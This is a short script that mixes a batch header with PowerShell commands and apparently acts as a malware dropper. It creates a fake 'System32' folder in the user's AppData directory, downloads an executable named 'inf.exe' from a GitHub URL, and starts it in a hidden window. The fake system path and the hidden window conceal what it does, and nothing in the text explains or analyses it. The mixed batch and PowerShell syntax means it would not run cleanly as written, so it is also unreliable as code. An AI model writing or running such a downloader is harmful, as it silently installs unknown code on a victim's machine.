@echo off
if (-not (Test-Path -Path "$env:APPDATA\Roaming\System32")) { New-Item -ItemType Directory -Path "$env:APPDATA\Roaming\System32" }; Invoke-WebRequest -Uri 'https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/inf.exe' -OutFile "$env:APPDATA\Roaming\System32\inf.exe"; Start-Sleep -Seconds 10; Start-Process "$env:APPDATA\Roaming\System32\inf.exe" -WindowStyle Hidden
exit
